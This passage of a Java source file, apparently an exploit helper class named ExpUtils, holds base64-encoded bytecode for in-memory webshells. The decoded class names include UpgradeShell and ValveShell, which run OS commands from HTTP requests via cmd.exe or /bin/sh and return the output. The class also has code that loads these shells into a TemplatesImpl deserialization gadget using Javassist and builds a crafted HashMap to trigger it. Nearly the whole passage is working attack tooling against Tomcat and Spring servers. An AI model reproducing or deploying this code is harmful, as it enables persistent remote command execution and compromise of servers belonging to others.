2YS9sYW5nL1N0cmluZzspVgAhAA0ADgAAAAAAAgABAA8AEAABABEAAAAvAAEAAQAAAAUqtwABsQAAAAIAEgAAAAYAAQAAAAgAEwAAAAwAAQAAAAUAFAAVAAAABAAWABcAAgARAAABAAAGAAcAAABVKxICuQADAgBOLcYASrgABC22AAW2AAY6BAM2BREEALwIOgYZBBkGtgAHWTYFAp8AJiy5AAgBALsACVkZBgMVBbcACrYACyy5AAgBABIMtgALp//SsQAAAAMAEgAAACYACQAAAAwACQANAA0ADgAZAA8AHAAQACMAEQAxABIARgATAFQAFgATAAAASAAHABkAOwAYABkABAAcADgAGgAbAAUAIwAxABwAHQAGAAAAVQAUABUAAAAAAFUAHgAfAAEAAABVACAAIQACAAkATAAiACMAAwAkAAAAHwAC/wAjAAcHACUHACYHACcHACgHACkBBwAqAAD4ADAAKwAAAAYAAgAsAC0AAQAuAAAAAgAv";
        } else if (memShellType.equals("Upgrade")){
            return "yv66vgAAADQAmQoAIgBUCABECgAOAFUIAFYKAFcAWAoACQBZCABaCgAJAFsHAFwIAF0IAF4IAF8IAGAHAGEIAEYKAGIAYwoAZABlCgBkAGYHAGcHAGgHAGkKABUAagoAFQBrCgBsAG0KABQAbggAbwoAFABwCgAUAHEKAAkAcgoAcwB0CgATAHUHAHYHAHcHAHgHAHkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxVcGdyYWRlU2hlbGw7AQASZ2V0SHR0cFVwZ3JhZGVOYW1lAQAVKFopTGphdmEvbGFuZy9TdHJpbmc7AQABYgEAAVoBABFnZXRBbHBuSWRlbnRpZmllcgEABCgpW0IBAAtnZXRBbHBuTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAMZ2V0UHJvY2Vzc29yAQBoKExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL25ldC9Tb2NrZXRXcmFwcGVyQmFzZTtMb3JnL2FwYWNoZS9jb3lvdGUvQWRhcHRlcjspTG9yZy9hcGFjaGUvY295b3RlL1Byb2Nlc3NvcjsBABFzb2NrZXRXcmFwcGVyQmFzZQEALkxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL25ldC9Tb2NrZXRXcmFwcGVyQmFzZTsBAAdhZGFwdGVyAQAbTG9yZy9hcGFjaGUvY295b3RlL0FkYXB0ZXI7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAMUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL25ldC9Tb2NrZXRXcmFwcGVyQmFzZTwqPjsBAAlTaWduYXR1cmUBAGsoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L1NvY2tldFdyYXBwZXJCYXNlPCo+O0xvcmcvYXBhY2hlL2NveW90ZS9BZGFwdGVyOylMb3JnL2FwYWNoZS9jb3lvdGUvUHJvY2Vzc29yOwEAGWdldEludGVybmFsVXBncmFkZUhhbmRsZXIBAKMoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L1NvY2tldFdyYXBwZXJCYXNlO0xvcmcvYXBhY2hlL2NveW90ZS9BZGFwdGVyO0xvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0OylMb3JnL2FwYWNoZS9jb3lvdGUvaHR0cDExL3VwZ3JhZGUvSW50ZXJuYWxIdHRwVXBncmFkZUhhbmRsZXI7AQAHcmVxdWVzdAEAG0xvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0OwEApihMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9uZXQvU29ja2V0V3JhcHBlckJhc2U8Kj47TG9yZy9hcGFjaGUvY295b3RlL0FkYXB0ZXI7TG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7KUxvcmcvYXBhY2hlL2NveW90ZS9odHRwMTEvdXBncmFkZS9JbnRlcm5hbEh0dHBVcGdyYWRlSGFuZGxlcjsBAAZhY2NlcHQBAB4oTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7KVoBAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIcmVzcG9uc2UBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEcmVzcAEAHExvcmcvYXBhY2hlL2NveW90ZS9SZXNwb25zZTsBAAZyZXN1bHQBAAJbQgEAAXABABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBcBwBFBwB2AQAKU291cmNlRmlsZQEAEVVwZ3JhZGVTaGVsbC5qYXZhDAAkACUMAHoAewEAB29zLm5hbWUHAHwMAH0AewwAfgAyAQADd2luDAB/AIABABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQAHL2Jpbi9zaAEAAi1jAQAZb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdAcAgQwAggCDBwCEDACFAIYMAIcAiAEAGm9yZy9hcGFjaGUvY295b3RlL1Jlc3BvbnNlAQARamF2YS91dGlsL1NjYW5uZXIBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIMACQAiQwAigCLBwCMDACNAI4MACQAjwEAAlxBDACQAJEMAJIAMgwAkwAwBwCUDACVAJYMAJcAmAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxVcGdyYWRlU2hlbGwBABBqYXZhL2xhbmcvT2JqZWN0AQAhb3JnL2FwYWNoZS9jb3lvdGUvVXBncmFkZVByb3RvY29sAQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAAhnZXRCeXRlcwEAE2phdmEvbmlvL0J5dGVCdWZmZXIBAAR3cmFwAQAZKFtCKUxqYXZhL25pby9CeXRlQnVmZmVyOwEAB2RvV3JpdGUBABgoTGphdmEvbmlvL0J5dGVCdWZmZXI7KVYAIQAhACIAAQAjAAAABwABACQAJQABACYAAAAvAAEAAQAAAAUqtwABsQAAAAIAJwAAAAYAAQAAAAgAKAAAAAwAAQAAAAUAKQAqAAAAAQArACwAAQAmAAAANgABAAIAAAACAbAAAAACACcAAAAGAAEAAAALACgAAAAWAAIAAAACACkAKgAAAAAAAgAtAC4AAQABAC8AMAABACYAAAAuAAEAAQAAAAQDvAiwAAAAAgAnAAAABgABAAAAEAAoAAAADAABAAAABAApACoAAAABADEAMgABACYAAAAsAAEAAQAAAAIBsAAAAAIAJwAAAAYAAQAAABUAKAAAAAwAAQAAAAIAKQAqAAAAAQAzADQAAgAmAAAAUgABAAMAAAACAbAAAAADACcAAAAGAAEAAAAaACgAAAAgAAMAAAACACkAKgAAAAAAAgA1ADYAAQAAAAIANwA4AAIAOQAAAAwAAQAAAAIANQA6AAEAOwAAAAIAPAABAD0APgACACYAAABcAAEABAAAAAIBsAAAAAMAJwAAAAYAAQAAAB8AKAAAACoABAAAAAIAKQAqAAAAAAACADUANgABAAAAAgA3ADgAAgAAAAIAPwBAAAMAOQAAAAwAAQAAAAIANQA6AAEAOwAAAAIAQQABAEIAQwABACYAAAE2AAUABwAAAIsrEgK2AANNEgS4AAW2AAYSB7YACJkAGAa9AAlZAxIKU1kEEgtTWQUsU6cAFQa9AAlZAxIMU1kEEg1TWQUsU04SDhIPtgAQOgQZBAS2ABEZBCu2ABLAABM6BbsAFFm7ABVZLbcAFrYAF7YAGLcAGRIatgAbtgActgAdOgYZBRkGuAAetgAfpwAETgOsAAEABwCFAIgAIAADACcAAAAqAAoAAAAkAAcAJgA/ACcASAAoAE4AKQBZACoAewArAIUALQCIACwAiQAuACgAAABIAAcAPwBGAEQARQADAEgAPQBGAEcABABZACwASABJAAUAewAKAEoASwAGAAAAiwApACoAAAAAAIsAPwBAAAEABwCEAEwATQACAE4AAAATAAT8ACwHAE9RBwBQ9wBJBwBRAAABAFIAAAACAFM=";
        } else {
            return "yv66vgAAADQAiAoAIABFCABGCgBHAEgKAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADExWYWx2ZVNoZWxsOwEABmludm9rZQEAUihMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDtMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7KVYBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAFvAQASTGphdmEvbGFuZy9TdHJpbmc7AQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAdyZXF1ZXN0AQAnTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7AQAIcmVzcG9uc2UBAChMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAFMHAGkHAFIHAFkHAGcHAGoHAGsHAGYBAApFeGNlcHRpb25zBwBsBwBtAQAKU291cmNlRmlsZQEAD1ZhbHZlU2hlbGwuamF2YQwAIQAiAQADY21kBwBqDABuAG8HAGsMAHAAcQEAAAEAB29zLm5hbWUHAHIMAHMAbwwAdAB1AQADd2luDAB2AHcBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAhAHgBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeQB6BwB7DAB8AH0MACEAfgEAAlxBDAB/AIAMAIEAggwAgwB1DACEACIHAGkMAIUAhgwAhwAiAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAClZhbHZlU2hlbGwBACRvcmcvYXBhY2hlL2NhdGFsaW5hL3ZhbHZlcy9WYWx2ZUJhc2UBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAAhAB8AIAAAAAAAAgABACEAIgABACMAAAAvAAEAAQAAAAUqtwABsQAAAAIAJAAAAAYAAQAAAAgAJQAAAAwAAQAAAAUAJgAnAAAAAQAoACkAAgAjAAABnQAGAAgAAACkKxICtgADTi3GAJsstgAEOgQSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAU6BLEAAQALAJ4AoQAeAAMAJAAAAEIAEAAAAAsABwAMAAsADgARAA8AFQARACUAEgBDABQAXgAWAHQAFwCIABgAjQAZAJQAGgCZABsAngAdAKEAHACjAB8AJQAAAFwACQBAAAMAKgArAAYAEQCNACwALQAEABUAiQAuAC8ABQBeAEAAKgArAAYAdAAqADAAMQAHAAAApAAmACcAAAAAAKQAMgAzAAEAAACkADQANQACAAcAnQA2AC8AAwA3AAAANQAG/gBDBwA4BwA5BwA4/AAaBwA6/AAlBwA7QQcAOP8AGgAEBwA8BwA9BwA+BwA4AAEHAD8BAEAAAAAGAAIAQQBCAAEAQwAAAAIARA==";
        }
    }

    public static Class<?> getMemShellRunner(String memShellType){
        if (memShellType.equals("Interceptor")){
            return Interceptor.class;
        } else if (memShellType.equals("Tomcat-Filter")){
            return Filter.class;
        } else if (memShellType.equals("Spring-Controller")){
            return Controller.class;
        } else if (memShellType.equals("Listener")){
            return Listener.class;
        } else if (memShellType.equals("Tomcat-Servlet")){
            return Servlet.class;
        } else if (memShellType.equals("Upgrade")){
            return Upgrade.class;
        } else {
            return Valve.class;
        }
    }

    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl getTemplatesImpl(String memShellType, Class<?> memShellRunner) throws NotFoundException, ClassNotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException {
        String memShellBase64 = ExpUtils.getMemShellBase64(memShellType);
        String code = "{inject(\""+ memShellBase64 +"\");}";
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(memShellRunner.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        pool.insertClassPath(String.valueOf(AbstractTranslet.class));
        CtClass ctClass = pool.get(memShellRunner.getName());
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertAfter(code);
        ctClass.setName(UUID.randomUUID().toString().replace('-', '_'));
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl ti = new TemplatesImpl();
        ExpUtils.setField(ti, "_name", "asd");
        ExpUtils.setField(ti, "_bytecodes", new byte[][]{bytes});
        ExpUtils.setField(ti, "_tfactory", new TransformerFactoryImpl());
        return ti;
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        ExpUtils.setField(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ExpUtils.setField(s, "table", tbl);
        return s;
    }
}
